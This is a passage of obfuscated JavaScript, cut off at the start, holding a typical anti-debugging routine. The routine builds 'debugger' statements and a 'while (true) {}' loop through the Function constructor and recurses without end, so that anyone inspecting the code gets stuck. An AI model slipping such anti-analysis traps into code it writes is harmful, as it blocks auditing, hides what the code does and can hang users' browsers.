          _Fc = false;
      }
    }
  }
  start();
}
function _o(_nd) {
  function _od(_pd) {
    if (typeof _pd === 'string')
      return function (_qd) {
      }.constructor('while (true) {}').apply('counter');
    else {
      if (('' + _pd / _pd).length !== 1 || _pd % 20 === 0) {
        (function () {
          return true;
        }.constructor('debu' + 'gger').call('action'));
      } else {
        (function () {
          return false;
        }.constructor('debu' + 'gger').apply('stateObject'));
      }
    }
    _od(++_pd);
  }
  try {
    if (_nd) {
      return _od;
    } else
      _od(0);
  } catch (err19) {
  }
}